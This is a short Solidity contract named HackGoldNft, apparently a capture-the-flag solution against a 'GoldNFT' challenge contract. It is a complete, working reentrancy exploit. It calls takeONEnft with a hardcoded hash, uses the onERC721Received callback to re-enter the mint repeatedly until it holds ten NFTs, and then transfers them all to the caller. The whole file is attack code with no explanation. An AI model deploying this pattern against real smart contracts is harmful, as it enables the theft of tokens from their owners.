// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ERC721} from "lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol";
import "./GoldNFT.sol";

contract HackGoldNft {
    uint256 i;

    function exploit(address addr) external {
        GoldNFT(addr).takeONEnft(0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe);
        for (uint256 id = 1; id < 11; ++id) {
            GoldNFT(addr).transferFrom(address(this), msg.sender, id);
        }
    }

    function onERC721Received(address, address, uint256, bytes memory) public returns (bytes4) {
        i += 1;
        if (i < 11) {
            GoldNFT(msg.sender).takeONEnft(0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe);
        }
        return this.onERC721Received.selector;
    }
}
